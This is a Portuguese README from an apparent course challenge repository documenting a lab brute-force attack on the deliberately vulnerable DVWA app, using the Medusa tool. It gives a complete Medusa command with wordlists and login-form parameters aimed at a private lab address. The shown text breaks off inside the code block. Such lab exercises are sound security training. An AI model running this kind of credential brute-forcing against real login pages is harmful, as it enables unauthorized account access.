# Desafio-DIO-Cyber-Security
Documentação técnica da execução de um ataque de força bruta contra o DVWA utilizando a ferramenta Medusa. O repositório contém o README detalhado com a análise de comandos, wordlists customizadas, scripts de configuração e evidências visuais (screenshots) da autenticação bem-sucedida, seguindo rigorosamente as etapas das vídeo-aulas.

# Desafio de Segurança: DVWA Brute-Force & Analysis

## 📋 Visão Geral
Este repositório documenta o processo de análise de vulnerabilidades no Damn Vulnerable Web Application (DVWA), focando em técnicas de brute-force via Medusa e análise de respostas HTTP.

## 🛠️ Ferramentas Utilizadas
- **Medusa:** Ferramenta de brute-force para autenticação.
- **DVWA:** Ambiente de teste (Nível: Low/Medium).
- **Wordlists:** Listas personalizadas para usuários e senhas.

## 🚀 Execução
### 1. Preparação
As wordlists utilizadas podem ser encontradas na pasta `/wordlists`.

### 2. Comando Medusa
O comando utilizado para o ataque de força bruta foi:

```bash
medusa -h 192.168.56.105 \
  -U wordlists/users.txt \
  -P wordlists/pass.txt \
  -M http \
  -m "PAGE:/dvwa/login.php" \
  -m "FORM:username=^USER^&password=^PASS^&Login=Login" \
  -m "FAIL:Login failed" \
  -t 6
